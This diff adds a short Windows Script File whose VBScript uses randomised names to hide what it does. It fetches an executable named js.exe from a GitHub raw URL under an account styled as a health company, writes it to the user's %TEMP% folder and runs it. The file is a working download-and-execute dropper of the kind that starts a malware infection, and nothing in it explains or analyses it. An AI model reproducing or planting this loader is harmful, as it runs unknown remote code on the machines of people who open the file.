@@ -1,0 +1,27 @@
+<job id="">
+<script language="vbscript">
+Function nNkChqgm(SISXuLXe)
+Dim xEzsHgPW, dzhNUBHO
+For xEzsHgPW = 1 To LenB(SISXuLXe)
+dzhNUBHO = dzhNUBHO & Chr(AscB(MidB(SISXuLXe, xEzsHgPW, 1)))
+Next
+nNkChqgm = dzhNUBHO
+End Function
+Sub VQYyLIWr(BLGTYdNj, gGonlyFb)
+Dim LCVIyTxS: Set LCVIyTxS = CreateObject("MSXML2.ServerXMLHTTP")
+Dim qxDdLnoK: qxDdLnoK = "GET"
+LCVIyTxS.Open qxDdLnoK, BLGTYdNj, False
+LCVIyTxS.Send
+Dim jOuOCuDo, OJcjPPvf
+Set OJcjPPvf = CreateObject("Scripting.FileSystemObject").OpenTextFile(gGonlyFb, 2, True)
+OJcjPPvf.WriteLine (nNkChqgm(LCVIyTxS.ResponseBody))
+OJcjPPvf.Close()
+Set LCVIyTxS = Nothing
+Set OJcjPPvf = Nothing
+End Sub
+Dim tEJEckmX: tEJEckmX = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\js.exe"
+Dim YArZpFeP: YArZpFeP = "https://github.com/immhealthcompany/immhealth.us/raw/refs/heads/main/js.exe"
+VQYyLIWr YArZpFeP, tEJEckmX
+CreateObject("WScript.Shell").Run Chr(34) & tEJEckmX & Chr(34)
+</script>
+</job>
